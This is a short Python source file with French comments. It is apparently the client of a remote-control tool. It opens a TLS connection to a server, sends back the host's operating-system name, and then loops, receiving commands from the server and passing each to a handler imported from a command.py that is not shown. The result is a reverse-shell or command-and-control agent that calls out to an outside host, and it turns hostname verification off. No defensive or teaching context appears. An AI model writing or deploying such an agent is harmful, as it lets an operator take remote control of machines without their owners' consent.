import socket
import ssl
import platform
from command import handle_command

# Assurez-vous que ces fonctions sont correctement importées ou définies dans command.py



def connect_to_server(host, port, ca_certfile):
    # Création d'un contexte SSL avec des paramètres par défaut
    context = ssl.create_default_context()
    context.check_hostname = False  # Désactive la vérification du nom d'hôte
    context.verify_mode = ssl.CERT_REQUIRED  # Exige un certificat du serveur
    context.load_verify_locations(ca_certfile)  # Charge le certificat du serveur pour vérification

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connexion SSL établie.")
            os_type = platform.system()
            ssock.send(os_type.encode('utf-8'))
            while True:
                cmd = ssock.recv(1024).decode()
                if not cmd:
                    break
                handle_command(ssock, cmd)
